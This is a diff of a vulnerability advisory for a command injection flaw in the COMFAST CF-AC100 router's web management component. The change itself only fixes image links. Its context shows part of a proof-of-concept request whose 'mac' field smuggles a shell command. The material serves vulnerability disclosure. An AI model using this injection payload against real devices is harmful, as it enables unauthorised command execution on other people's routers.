@@ -14,11 +14,11 @@ A command injection vulnerability has been discovered in COMFAST CF-AC100 V2.6.0
 
 ### 漏洞详情
 
-![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-23-17-17-39-b100ced0-ae76-419f-9430-a3312246f82e.png)
+![](../main/images/2026-02-23-17-17-39-b100ced0-ae76-419f-9430-a3312246f82e.png)
 
 The trigger point is located in the `sub_41781C` method of the `webmggnt` component. Here, the `mac` field is not validated and is concatenated using `sprintf`, and then executed using `system`.
 
-![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-23-18-12-13-2194b478-35e6-4e4b-a5ff-02ecb066c468.png)
+![](../main/images/2026-02-23-18-12-13-2194b478-35e6-4e4b-a5ff-02ecb066c468.png)
 
 ### 概念验证
 
@@ -54,4 +54,5 @@ Cookie: language=sc; COMFAST_SESSIONID=0200a8c0-4261ffffffc85cffffff8a5f-6b8b456
 {"ifname":"127.0.0.1",  "mac":"; echo wireless_device_dissoc  > /tmp/1.txt #"}
 ```
 
-![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-23-18-13-04-fc673566-3340-4f84-84c8-02af0065e647.png)
+![](../main/images/2026-02-23-18-13-04-fc673566-3340-4f84-84c8-02af0065e647.png)
+
